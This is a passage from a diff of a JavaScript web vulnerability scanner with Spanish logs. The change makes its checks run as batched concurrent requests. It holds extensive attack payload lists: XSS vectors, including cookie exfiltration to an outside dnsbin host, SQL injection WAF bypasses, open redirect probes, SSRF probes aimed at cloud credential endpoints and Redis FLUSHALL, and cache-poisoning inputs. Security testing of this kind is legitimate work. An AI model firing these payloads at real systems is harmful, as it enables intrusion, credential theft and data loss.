src=java\u0073cript:\u0061lert(1)\u003e\u003c\u002fframeset\u003e",target+"\u002f?q=\u003ckeygen\u002f\u006fnfocus=\u0061lert(1) autofocus\u003e",target+"\u002f?q=\u003cpicture\u003e\u003csource\u002f\u006fnerror=\u0061lert(1)\u003e\u003cimg\u003e\u003c\u002fpicture\u003e",target+"\u002f?q=\u003cdiv\u002f\u006fnmouseover=\u0061lert(1)\u003ex",target+"\u002f?q=\u003cplaintext\u003e\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e",target+"\u002f?q=\u003csvg\u003e\u003c\u0073cript\u003e\u0061lert(1)\u003c\\\u002f\u0073cript\u003e\u003c\u002fsvg\u003e",target+"\u002f?q=\u003cimg src=x \u006fnerror=\u0061lert(document.domain)\u003e",target+"\u002f?q=\u003cimg src=x \u006fnerror=fetch(\"http:\u002f\u002ftudelasec.dnsbin.net\u002f\"+document.cookie)\u003e",target+"\u002f?q=jaVa\u0073Cript:\u002f*-\u002f*`\u002f*\\`\u002f*'\u002f*\"\u002f**\u002f(\u002f* *\u002f\u006fNcliCk=\u0061lert() )\u002f\u002f%0D%0A%0d%0a\u002f\u002f\u003c\u002fstYle\u002f\u003c\u002ftitLe\u002f\u003c\u002fteXtarEa\u002f\u003c\u002f\u0073cRipt\u002f--!\u003e\\x3csVg\u002f\u003csVg\u002f\u006fNloAd=\u0061lert()\u002f\u002f\u003e\\x3e",target+"\u002f?q=\u003csvg\u002f\u006fnload=eval(atob(\"YWxlcnQoMSk=\"))\u003e",target+"\u002f?q=\u003c\u0073cript\u003eeval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))\u003c\\\u002f\u0073cript\u003e",target+"\u002f?q=\u003ciframe \u0073rcdoc=\"\u003csvg \u006fnload=\u0061lert(1)\u003e\"\u003e",target+"\u002f?q=\u003ciframe\u002fsrc=java\u0073cript:\u0061lert(1)\u003e",target+"\u002f?q=\u003cmeta\u002fhttp-equiv=refresh content=0;url=java\u0073cript:\u0061lert(1)\u003e",target+"\u002f?q=\u003clink rel=import href=\"data:text\u002fhtml,\u003csvg \u006fnload=\u0061lert(1)\u003e\"\u003e",target+"\u002f?q=\u003c\u0073cript src=data:,\u0061lert(1)\u003e",target+"\u002f?q=\u003c\u0073cript src=http:\u002f\u002ftudelasec.dnsbin.net\u002fxss.js\u003e\u003c\u002f\u0073cript\u003e",target+"\u002f?q=\"\u003e\u003c\u0073cript\u003e\u0061lert(document.cookie)\u003c\u002f\u0073cript\u003e",target+"\u002f?q=java\u0073cript:\u0061lert(1)\u002f\u002f",target+"\u002f?q=data:text\u002fhtml,\u003csvg \u006fnload=\u0061lert(1)\u003e",target+"\u002f?q=data:text\u002fhtml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"];
 var xssAdvFound=0;
-for(var xa=0;xa<xssAdv.length;xa++){var rxa=await get(xssAdv[xa]);
+var xssAdvRes=await smartBatch(xssAdv);
+for(var xa=0;xa<xssAdv.length;xa++){var rxa=(xssAdvRes[xa]&&xssAdvRes[xa].status==='fulfilled'&&xssAdvRes[xa].value)?xssAdvRes[xa].value:{ok:false,status:0,body:''};
 if(rxa.ok&&rxa.body){var xssAdvBody=rxa.body.replace(new RegExp(target.replace(/[.*+?^${}()|[\]\\]/g,"\\$\u0026"),'g'),'');
 if(/\x3csvg\/\x6fnload=\x61lert\(1\)\x3e|\x3cimg\/src=x\/\x6fnerror=\x61lert\(1\)\x3e|\x3cbody\/\x6fnload=\x61lert\(1\)\x3e|\x3cdetails\/open\/\x6fntoggle=\x61lert\(1\)\x3e|\x3cmarquee\/\x6fnstart=\x61lert\(1\)\x3e|\x6fnload=\x61lert|\x6fnerror=\x61lert/i.test(xssAdvBody)&&!/\x3csvg\/\x6fnload|\x3cimg\/src=x\/\x6fnerror|\x3cbody\/\x6fnload|\x3cdetails\/open|\x3cmarquee\/\x6fnstart/i.test(xssBaseBody)){logErr('XSS Avanzado: payload reflejado sin sanitizar — '+xssAdv[xa].split('?')[1].slice(0,50));addF('high','XSS Avanzado','Payload XSS moderno reflejado sin sanitizar');markCrit('p13');xssAdvFound++;break;}
 if(rxa.body.indexOf("\u0061lert(1)")>-1&&rxa.body.indexOf("\u003csvg")>-1&&!/\x3csvg.*\x6fnload/i.test(xssBaseBody)){logErr('XSS SVG: payload SVG reflejado sin escape');addF('high','XSS via SVG','SVG payload reflejado sin escape');markCrit('p13');xssAdvFound++;break;}
 if(rxa.body.indexOf("java\u0073cript:\u0061lert(1)")>-1&&xssBaseBody.indexOf("java\u0073cript:\u0061lert")===-1){logErr("XSS java\u0073cript: URI reflejado");addF('high',"XSS java\u0073cript URI","URI scheme java\u0073cript: reflejado");markCrit('p13');xssAdvFound++;break;}
-if(rxa.body.indexOf("data:text\u002fhtml,\u003csvg \u006fnload=\u0061lert(1)\u003e")>-1&&xssBaseBody.indexOf("data:text\u002fhtml")===-1){logErr('XSS data URI reflejado');addF('high','XSS via data URI',"data:text\u002fhtml con SVG \u006fnload reflejado");markCrit('p13');xssAdvFound++;break;}}
-await sl(10);}
+if(rxa.body.indexOf("data:text\u002fhtml,\u003csvg \u006fnload=\u0061lert(1)\u003e")>-1&&xssBaseBody.indexOf("data:text\u002fhtml")===-1){logErr('XSS data URI reflejado');addF('high','XSS via data URI',"data:text\u002fhtml con SVG \u006fnload reflejado");markCrit('p13');xssAdvFound++;break;}}}
 if(xssAdvFound===0)logOk('XSS avanzado: no se detectaron vectores nuevos');
 else logErr('XSS avanzado: '+xssAdvFound+' vectores adicionales detectados');
 /* F13c: SQLi polyglot y WAF bypass */
 logInfo('F13c: SQLi polyglot y WAF bypass...');
 var sqliPoly=[target+"\u002f?id=1 \u002f*!UNION*\u002f \u002f*!SELECT*\u002f 1,2,3--",target+"\u002f?id=1 \u002f*!50000UNION*\u002f \u002f*!50000SELECT*\u002f 1,2,3--",target+"\u002f?id=1 UnIoN SeLeCt 1,2,3--",target+"\u002f?id=1 %55NION %53ELECT 1,2,3--",target+"\u002f?id=1 UNION%a0SELECT 1,2,3--",target+"\u002f?id=1 UNION%0bSELECT 1,2,3--",target+"\u002f?id=1\u002f*!12345UNION*\u002f\u002f*!12345SELECT*\u002f1,2,3--",target+"\u002f?id=1\u002f**\u002fUNION\u002f**\u002fSELECT\u002f**\u002f1,2,3--",target+"\u002f?id=1+UNION+SELECT+1,2,3--",target+"\u002f?id=1%20UNION%20SELECT%201,2,3--",target+"\u002f?id=1%09UNION%09SELECT%091,2,3--",target+"\u002f?id=1%0aUNION%0aSELECT%0a1,2,3--",target+"\u002f?id=1%0dUNION%0dSELECT%0d1,2,3--",target+"\u002f?id=1%23UNION%23SELECT%231,2,3--",target+"\u002f?id=1%2f**%2fUNION%2f**%2fSELECT%2f**%2f1,2,3--",target+"\u002f?id=1%27%20UNION%20SELECT%201,2,3--",target+"\u002f?id=-1%27%20UNION%20ALL%20SELECT%201,2,3,4,5--",target+"\u002f?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL--",target+"\u002f?id=1%20AND%201%3D1--",target+"\u002f?id=1%20OR%201%3D1--",target+"\u002f?id=1%27)%20UNION%20SELECT%201,2,3--",target+"\u002f?id=1%27))%20UNION%20SELECT%201,2,3--",target+"\u002f?id=1%27%20ORDER%20BY%2010--",target+"\u002f?id=1%27%20GROUP%20BY%2010--",target+"\u002f?id=1%27%20HAVING%201%3D1--",target+"\u002f?id=1%20AND%20(SELECT%209926%20FROM%20(SELECT%20COUNT(*),CONCAT(0x7170717871,(SELECT%20version()),0x716b6b7171,FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--",target+"\u002f?id=1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))--",target+"\u002f?id=1%20AND%20updatexml(1,concat(0x7e,(SELECT%20database())),1)--",target+"\u002f?id=1%27%20AND%20EXTRACTVALUE(123,CONCAT(0x5c,0x7e,(SELECT%20USER())))--",target+"\u002f?id=1%20AND%20SLEEP(5)--",target+"\u002f?id=1%27%20AND%20SLEEP(5)--",target+"\u002f?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(sleep(5)))a)--",target+"\u002f?id=1;WAITFOR%20DELAY%20%270:0:5%27--",target+"\u002f?id=1%27%20AND%20%27a%27=%27a",target+"\u002f?id=1%20AND%202%3E1--",target+"\u002f?id=(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%201\u002f0%20END))--",target+"\u002f?id=1%27%20AND%20ASCII(SUBSTRING((SELECT%20database()),1,1))%3E64--"];
 var sqliPolyFound=0;
-for(var sp=0;sp<sqliPoly.length;sp++){var rsp=await get(sqliPoly[sp]);
+var sqliPolyRes=await smartBatch(sqliPoly);
+for(var sp=0;sp<sqliPoly.length;sp++){var rsp=(sqliPolyRes[sp]&&sqliPolyRes[sp].status==='fulfilled'&&sqliPolyRes[sp].value)?sqliPolyRes[sp].value:{ok:false,status:0,body:''};
 if(rsp.ok&&rsp.body&&sqliErrRe.test(rsp.body)&&!sqliErrRe.test(sqliBaseBody)){logErr("SQLi polyglot\u002fWAF bypass: "+sqliPoly[sp].split('?')[1].slice(0,40));addF('high','SQLi WAF bypass',"SQLi via encoding\u002fcomment bypass");markCrit('p13');sqliPolyFound++;break;}
 if(rsp.ok&&rsp.body&&/ORA-\d{5}|SQLSTATE|mysql_fetch|sql syntax|PostgreSQLError|psycopg2|Microsoft SQL Server|ODBC|SQLServer JDBC|mariadb/i.test(rsp.body)&&!sqliErrRe.test(sqliBaseBody)){logErr('SQLi bypass: error SQL especifico con payload evadido');addF('high','SQLi WAF bypass exitoso','Error SQL revelado via bypass de encoding');markCrit('p13');sqliPolyFound++;break;}}
 if(sqliPolyFound===0)logOk('SQLi polyglot: sin bypass exitoso detectado');
@@ -27944,7 +28569,8 @@ if(gql.status===200){logWarn("GraphQL endpoint: \u002fgraphql");addF('high','Gra
 var gqlPost=await reqM(target+"\u002fgraphql",'POST');
 if(gqlPost&&gqlPost.ok){logErr('GraphQL POST habilitado — introspeccion posible');addF('high','GraphQL POST habilitado','Introspección activa');markCrit('p15');}}
 var apiRoutes=["\u002fapi","\u002fapi\u002fv1","\u002fapi\u002fv2","\u002frest","\u002fv1","\u002fv2","\u002fapi\u002fhealth","\u002fapi\u002fstatus","\u002fapi\u002fswagger","\u002fapi\u002fdocs"];
-for(var ai=0;ai<apiRoutes.length;ai++){var ra=await get(target+apiRoutes[ai]);if(ra.status===200){logWarn('API endpoint: '+apiRoutes[ai]);addF('low','API endpoint: '+apiRoutes[ai],'Explorar endpoints');}await sl(10);}
+var apiResArr=await smartBatch(apiRoutes.map(function(ar){return target+ar;}));
+for(var ai=0;ai<apiRoutes.length;ai++){var ra=(apiResArr[ai]&&apiResArr[ai].status==='fulfilled'&&apiResArr[ai].value)?apiResArr[ai].value:{status:0};if(ra.status===200){logWarn('API endpoint: '+apiRoutes[ai]);addF('low','API endpoint: '+apiRoutes[ai],'Explorar endpoints');}}
 
 /* F16: Secrets */
 await tp(15);logSep('F16 — Secretos en HTML');
@@ -27960,8 +28586,9 @@ if(sensComments.length>0){logWarn('Comentarios HTML sensibles: '+sensComments.le
 /* F17: Open Redirect */
 await tp(16);logSep('F17 — Open Redirect');
 var rdTests=[[target+"?redirect=https:\u002f\u002fevil.com",'redirect'],[target+"?url=https:\u002f\u002fevil.com",'url'],[target+"?next=https:\u002f\u002fevil.com",'next'],[target+"?return=https:\u002f\u002fevil.com",'return'],[target+"?goto=https:\u002f\u002fevil.com",'goto'],[target+"?redir=https:\u002f\u002fevil.com",'redir'],[target+"?target=https:\u002f\u002fevil.com",'target'],[target+"?dest=https:\u002f\u002fevil.com",'dest'],[target+"?continue=https:\u002f\u002fevil.com",'continue'],[target+"?to=https:\u002f\u002fevil.com",'to'],[target+"?rurl=https:\u002f\u002fevil.com",'rurl'],[target+"?link=https:\u002f\u002fevil.com",'link'],[target+"?image_url=https:\u002f\u002fevil.com",'image_url'],[target+"?callback=https:\u002f\u002fevil.com",'callback'],[target+"?forward=https:\u002f\u002fevil.com",'forward'],[target+"?out=https:\u002f\u002fevil.com",'out'],[target+"?view=https:\u002f\u002fevil.com",'view'],[target+"?page=https:\u002f\u002fevil.com",'page'],[target+"?location=https:\u002f\u002fevil.com",'location'],[target+"?from=https:\u002f\u002fevil.com",'from'],[target+"?ref=https:\u002f\u002fevil.com",'ref'],[target+"?back=https:\u002f\u002fevil.com",'back'],[target+"?path=https:\u002f\u002fevil.com",'path'],[target+"?href=https:\u002f\u002fevil.com",'href'],[target+"?exit=https:\u002f\u002fevil.com",'exit'],[target+"?return_to=https:\u002f\u002fevil.com",'return_to'],[target+"?returnUrl=https:\u002f\u002fevil.com",'returnUrl'],[target+"?return_url=https:\u002f\u002fevil.com",'return_url'],[target+"?redirect_to=https:\u002f\u002fevil.com",'redirect_to'],[target+"?redirect_url=https:\u002f\u002fevil.com",'redirect_url'],[target+"?jump=https:\u002f\u002fevil.com",'jump'],[target+"?go=https:\u002f\u002fevil.com",'go'],[target+"?switch=https:\u002f\u002fevil.com",'switch'],[target+"?navigate=https:\u002f\u002fevil.com",'navigate'],[target+"?entry=https:\u002f\u002fevil.com",'entry'],[target+"?origin=https:\u002f\u002fevil.com",'origin'],[target+"?open=https:\u002f\u002fevil.com",'open'],[target+"?checkout=https:\u002f\u002fevil.com",'checkout'],[target+"?checkout_url=https:\u002f\u002fevil.com",'checkout_url'],[target+"?file=https:\u002f\u002fevil.com",'file']];
-for(var ri2=0;ri2<rdTests.length;ri2++){var rr=await reqM(rdTests[ri2][0],'GET');
-if(rr&&rr.headers&&rr.headers['location']&&rr.headers['location'].indexOf('evil.com')>-1){logErr('Open Redirect: '+rdTests[ri2][1]);addF('high','Open Redirect','Redirige a dominio externo');markCrit('p17');break;}await sl(10);}
+var rdResArr=await smartBatch(rdTests.map(function(rt){return rt[0];}));
+for(var ri2=0;ri2<rdTests.length;ri2++){var rr=(rdResArr[ri2]&&rdResArr[ri2].status==='fulfilled'&&rdResArr[ri2].value)?rdResArr[ri2].value:null;
+if(rr&&rr.headers&&rr.headers['location']&&rr.headers['location'].indexOf('evil.com')>-1){logErr('Open Redirect: '+rdTests[ri2][1]);addF('high','Open Redirect','Redirige a dominio externo');markCrit('p17');break;}}
 logOk('Open redirect probado con '+rdTests.length+' parametros');
 
 /* F18: Path Traversal */
@@ -28040,8 +28667,9 @@ logOk('JWT analysis completo');
 /* F21: SSRF */
 await tp(20);logSep('F21 — SSRF');
 var ssrfTests=[target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002f",target+"?endpoint=http:\u002f\u002flocalhost\u002f",target+"?src=http:\u002f\u002f127.0.0.1\u002f",target+"?host=http:\u002f\u002f169.254.169.254\u002f",target+"?proxy=http:\u002f\u002f[::1]\u002f",target+"?target=http:\u002f\u002fmetadata.google.internal\u002f",target+"?ref=http:\u002f\u002f169.254.169.254\u002fcomputeMetadata\u002fv1\u002f",target+"?fetch=http:\u002f\u002flocalhost:8080\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002fiam\u002fsecurity-credentials\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002fiam\u002fsecurity-credentials\u002frole-name",target+"?url=http:\u002f\u002f0.0.0.0\u002f",target+"?url=http:\u002f\u002f[::]\u002f",target+"?url=http:\u002f\u002f2130706433\u002f",target+"?url=http:\u002f\u002f017700000001\u002f",target+"?url=http:\u002f\u002f127.1\u002f",target+"?url=http:\u002f\u002f127.0.0.1:22\u002f",target+"?url=http:\u002f\u002f127.0.0.1:6379\u002f",target+"?url=http:\u002f\u002f127.0.0.1:27017\u002f",target+"?url=http:\u002f\u002f127.0.0.1:9200\u002f",target+"?url=http:\u002f\u002fmetadata.google.internal\u002fcomputeMetadata\u002fv1\u002finstance\u002fservice-accounts\u002fdefault\u002ftoken",target+"?url=http:\u002f\u002f169.254.169.254\u002fmetadata\u002finstance?api-version=2021-02-01",target+"?url=http:\u002f\u002f169.254.169.254\u002fmetadata\u002fidentity\u002foauth2\u002ftoken?api-version=2018-02-01",target+"?url=http:\u002f\u002f100.100.100.200\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fuser-data",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fdynamic\u002finstance-identity\u002fdocument",target+"?url=file:\u002f\u002f\u002fetc\u002fpasswd",target+"?url=file:\u002f\u002f\u002fetc\u002fshadow",target+"?url=file:\u002f\u002f\u002fproc\u002fself\u002fenviron",target+"?url=gopher:\u002f\u002f127.0.0.1:6379\u002f_INFO",target+"?url=dict:\u002f\u002f127.0.0.1:11211\u002f",target+"?url=http:\u002f\u002flocalhost:8080\u002factuator\u002fenv",target+"?url=http:\u002f\u002flocalhost:8080\u002factuator\u002fheapdump",target+"?url=http:\u002f\u002flocalhost:9090\u002fmetrics",target+"?url=http:\u002f\u002f127.0.0.1:80\u002f",target+"?url=http:\u002f\u002f127.0.0.1:443\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8080\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8443\u002f",target+"?url=http:\u002f\u002f127.0.0.1:3000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:5432\u002f",target+"?url=http:\u002f\u002f127.0.0.1:3306\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8500\u002f",target+"?url=http:\u002f\u002f127.0.0.1:2375\u002fv1.24\u002finfo",target+"?url=http:\u002f\u002f127.0.0.1:10250\u002fpods",target+"?url=http:\u002f\u002f127.0.0.1:6443\u002fapi",target+"?url=http:\u002f\u002f127.0.0.1:15672\u002f",target+"?url=http:\u002f\u002f127.0.0.1:5601\u002f",target+"?url=http:\u002f\u002f[::ffff:127.0.0.1]\u002f",target+"?url=http:\u002f\u002f0x7f000001\u002f",target+"?url=http:\u002f\u002f0177.0.0.1\u002f",target+"?url=http:\u002f\u002f127.0.0.1.nip.io\u002f",target+"?url=http:\u002f\u002f0\u002f",target+"?url=http:\u002f\u002f127.127.127.127\u002f",target+"?url=http:\u002f\u002flocaltest.me\u002f",target+"?url=http:\u002f\u002fspoofed.burpcollaborator.net\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002fiam\u002fsecurity-credentials\u002fs3access",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002fpublic-keys\u002f0\u002fopenssh-key",target+"?url=http:\u002f\u002f169.254.170.2\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002f169.254.170.23\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002fmetadata.azure.com\u002fmetadata\u002finstance?api-version=2021-02-01",target+"?url=http:\u002f\u002froot:root@127.0.0.1:6379\u002f",target+"?url=http:\u002f\u002fadmin:admin@127.0.0.1:27017\u002f",target+"?url=http:\u002f\u002f127.0.0.1:5984\u002f_all_dbs",target+"?url=http:\u002f\u002f127.0.0.1:11211\u002fstats",target+"?url=http:\u002f\u002f127.0.0.1:9042\u002f",target+"?url=http:\u002f\u002f127.0.0.1:7474\u002fbrowser\u002f",target+"?url=http:\u002f\u002f127.0.0.1:4848\u002f",target+"?url=http:\u002f\u002f127.0.0.1:7077\u002f",target+"?url=http:\u002f\u002f127.0.0.1:4040\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8086\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8161\u002fadmin\u002f",target+"?url=http:\u002f\u002f127.0.0.1:9092\u002f",target+"?url=http:\u002f\u002f127.0.0.1:2181\u002f",target+"?url=http:\u002f\u002f127.0.0.1:5672\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8443\u002fwd\u002fhub\u002f",target+"?url=http:\u002f\u002f127.0.0.1:4444\u002fwd\u002fhub\u002f",target+"?url=http:\u002f\u002f127.0.0.1:6080\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8834\u002f",target+"?url=http:\u002f\u002f127.0.0.1:3000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:4000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:5000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:7000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:9001\u002f",target+"?url=http:\u002f\u002f127.0.0.1:9090\u002f",target+"?url=http:\u002f\u002f127.0.0.1:9999\u002f",target+"?url=http:\u002f\u002f127.0.0.1:10000\u002f",target+"?url=http:\u002f\u002f127.0.0.1:15672\u002f",target+"?url=http:\u002f\u002f127.0.0.1:5601\u002fapp\u002fkibana",target+"?url=http:\u002f\u002f127.0.0.1:8443\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8888\u002f",target+"?url=http:\u002f\u002f127.0.0.1:9090\u002fapi\u002fv1\u002ftargets",target+"?url=http:\u002f\u002f127.0.0.1:9200\u002f_cluster\u002fhealth",target+"?url=http:\u002f\u002f127.0.0.1:5984\u002f_utils\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8500\u002fui\u002f",target+"?url=http:\u002f\u002f127.0.0.1:2375\u002fv1.24\u002fcontainers\u002fjson",target+"?url=http:\u002f\u002f127.0.0.1:10250\u002fpods",target+"?url=http:\u002f\u002f127.0.0.1:6443\u002fapi\u002fv1\u002fnamespaces",target+"?url=http:\u002f\u002f127.0.0.1:3000\u002fapi\u002fadmin",target+"?url=http:\u002f\u002f127.0.0.1:8086\u002fquery?q=SHOW+DATABASES",target+"?url=http:\u002f\u002f127.0.0.1:7474\u002fdb\u002fdata\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8088\u002f",target+"?url=http:\u002f\u002f127.0.0.1:27017\u002fadmin\u002f",target+"?url=http:\u002f\u002f0177.0.0.01\u002f",target+"?url=http:\u002f\u002f0x7f.0x0.0x0.0x1\u002f",target+"?url=http:\u002f\u002f017700000001\u002f",target+"?url=http:\u002f\u002f2130706433\u002f",target+"?url=http:\u002f\u002f3232235521\u002f",target+"?url=http:\u002f\u002f0.0.0.0:80\u002f",target+"?url=http:\u002f\u002f[::1]:80\u002f",target+"?url=http:\u002f\u002f[0:0:0:0:0:0:0:1]\u002f",target+"?url=http:\u002f\u002flocaltest.me\u002f",target+"?url=http:\u002f\u002fcustomer1.app.localhost\u002f",target+"?url=http:\u002f\u002fbchlorine.localhost\u002f",target+"?url=http:\u002f\u002f127.0.0.1.nip.io\u002f",target+"?url=http:\u002f\u002fspoofed.burpcollaborator.net\u002f",target+"?url=http:\u002f\u002finternal.localhost\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002fiam\u002fsecurity-credentials\u002fs3access",target+"?url=http:\u002f\u002f169.254.169.254\u002flatest\u002fmeta-data\u002fpublic-keys\u002f0\u002fopenssh-key",target+"?url=http:\u002f\u002f169.254.170.2\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002f169.254.170.23\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002fmetadata.azure.com\u002fmetadata\u002finstance?api-version=2021-02-01",target+"?url=http:\u002f\u002fmetadata.google.internal\u002fcomputeMetadata\u002fv1\u002finstance\u002fservice-accounts\u002fdefault\u002ftoken",target+"?url=http:\u002f\u002f100.100.100.200\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002fmetadata.tencentyun.com\u002flatest\u002fmeta-data\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002fcomputeMetadata\u002fv1\u002f",target+"?url=http:\u002f\u002f169.254.169.254\u002fmetadata\u002finstance?api-version=2021-02-01",target+"?url=http:\u002f\u002f169.254.169.254\u002fmetadata\u002fidentity\u002foauth2\u002ftoken?api-version=2018-02-01",target+"?url=http:\u002f\u002f127.0.0.1:6379\u002fCONFIG\u002fGET\u002fdir",target+"?url=http:\u002f\u002f127.0.0.1:6379\u002fFLUSHALL",target+"?url=http:\u002f\u002f127.0.0.1:27017\u002fadmin\u002f%24where",target+"?url=http:\u002f\u002f127.0.0.1:7474\u002fdb\u002fneo4j\u002ftransaction",target+"?url=http:\u002f\u002f127.0.0.1:11211\u002fstats\u002fsettings",target+"?url=http:\u002f\u002f127.0.0.1:8500\u002fv1\u002fkv\u002f?recurse",target+"?url=http:\u002f\u002f127.0.0.1:4001\u002fv1\u002fkv\u002f",target+"?url=http:\u002f\u002f127.0.0.1:8200\u002fv1\u002fsys\u002fhealth",target+"?url=http:\u002f\u002f127.0.0.1:5432\u002f",target+"?url=http:\u002f\u002f127.0.0.1:3306\u002f",target+"?url=http:\u002f\u002f127.0.0.1:22\u002f",target+"?url=http:\u002f\u002f127.0.0.1:21\u002f",target+"?url=http:\u002f\u002f127.0.0.1:25\u002f",target+"?url=http:\u002f\u002f127.0.0.1:53\u002f",target+"?url=http:\u002f\u002f127.0.0.1:161\u002f",target+"?url=http:\u002f\u002f127.0.0.1:389\u002f",target+"?url=http:\u002f\u002f127.0.0.1:443\u002f",target+"?url=http:\u002f\u002f127.0.0.1:445\u002f",target+"?url=http:\u002f\u002f127.0.0.1:873\u002f",target+"?url=http:\u002f\u002f127.0.0.1:1433\u002f",target+"?url=http:\u002f\u002f127.0.0.1:1521\u002f"];
-for(var si=0;si<ssrfTests.length;si++){var rs=await get(ssrfTests[si]);
-if(rs.ok&&rs.body&&(rs.body.indexOf('ami-id')>-1||rs.body.indexOf('instance-id')>-1||rs.body.indexOf('root:x')>-1||rs.body.indexOf('ami-')>-1||rs.body.indexOf('reservation')>-1)){logErr('SSRF CONFIRMADO: '+ssrfTests[si].split('?')[1]);addF('crit','SSRF — Acceso a metadata','Servidor hace peticiones internas');markCrit('p21');break;}await sl(10);}
+var ssrfResArr=await smartBatch(ssrfTests);
+for(var si=0;si<ssrfTests.length;si++){var rs=(ssrfResArr[si]&&ssrfResArr[si].status==='fulfilled'&&ssrfResArr[si].value)?ssrfResArr[si].value:{ok:false,body:''};
+if(rs.ok&&rs.body&&(rs.body.indexOf('ami-id')>-1||rs.body.indexOf('instance-id')>-1||rs.body.indexOf('root:x')>-1||rs.body.indexOf('ami-')>-1||rs.body.indexOf('reservation')>-1)){logErr('SSRF CONFIRMADO: '+ssrfTests[si].split('?')[1]);addF('crit','SSRF — Acceso a metadata','Servidor hace peticiones internas');markCrit('p21');break;}}
 logOk('SSRF probado con '+ssrfTests.length+' payloads');
 
 /* F22: Subdomain Takeover */
@@ -28055,8 +28683,9 @@ logOk('Subdomain takeover check completo');
 /* F23: Cache Poisoning */
 await tp(22);logSep('F23 — Cache Poisoning');
 var cacheTests=[target+"?utm_source=\u003c\u0073cript\u003e\u0061lert(1)\u003c\u002f\u0073cript\u003e",target+'?x_forwarded_host=evil.com',target+"?utm_content=\u003csvg\u002f\u006fnload=\u0061lert(1)\u003e",target+"?utm_campaign=\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e",target+"?utm_term=java\u0073cript:\u0061lert(1)",target+"?utm_medium=\u003cbody \u006fnload=\u0061lert(1)\u003e",target+"?ref=\u003c\u0073cript\u003e\u0061lert(document.cookie)\u003c\u002f\u0073cript\u003e",target+"?tracking=\u003ciframe src=java\u0073cript:\u0061lert(1)\u003e",target+"?source=\u003csvg\u003e\u003canimate \u006fnbegin=\u0061lert(1)\u003e",target+"?campaign=\u003cdetails open \u006fntoggle=\u0061lert(1)\u003e",target+'?x_original_url=evil.com',target+'?x_forwarded_for=127.0.0.1',target+'?x_real_ip=127.0.0.1',target+'?x_forwarded_proto=https',target+'?x_host=evil.com',target+'?true_client_ip=127.0.0.1',target+'?cf_connecting_ip=127.0.0.1',target+"?x_arbitrary_header=\u003c\u0073cript\u003e\u0061lert(1)\u003c\u002f\u0073cript\u003e"];
-for(var cai=0;cai<cacheTests.length;cai++){var rc=await get(cacheTests[cai]);
-if(rc.ok&&rc.body&&rc.body.indexOf("\u003c\u0073cript\u003e\u0061lert(1)")>-1){logErr('Cache poisoning posible: payload reflejado');addF('high','Cache Poisoning','Payload cacheado');markCrit('p23');break;}await sl(10);}
+var cacheResArr=await smartBatch(cacheTests);
+for(var cai=0;cai<cacheTests.length;cai++){var rc=(cacheResArr[cai]&&cacheResArr[cai].status==='fulfilled'&&cacheResArr[cai].value)?cacheResArr[cai].value:{ok:false,body:''};
+if(rc.ok&&rc.body&&rc.body.indexOf("\u003c\u0073cript\u003e\u0061lert(1)")>-1){logErr('Cache poisoning posible: payload reflejado');addF('high','Cache Poisoning','Payload cacheado');markCrit('p23');break;}}
 if(S.headers['x-cache']||S.headers['x-cache-status']||S.headers['cf-cache-status']){logInfo('Cache activo: '+(S.headers['x-cache']||S.headers['cf-cache-status']||''));addF('low','Cache header presente',"CDN\u002fCache detectado");}
 logOk('Cache poisoning analizado');
 
@@ -28084,12 +28713,12 @@ if(ctxSkip('nosqli')){logInfo("PRUNE (S.ctx): F25 omitida — JAMstack\u002festa
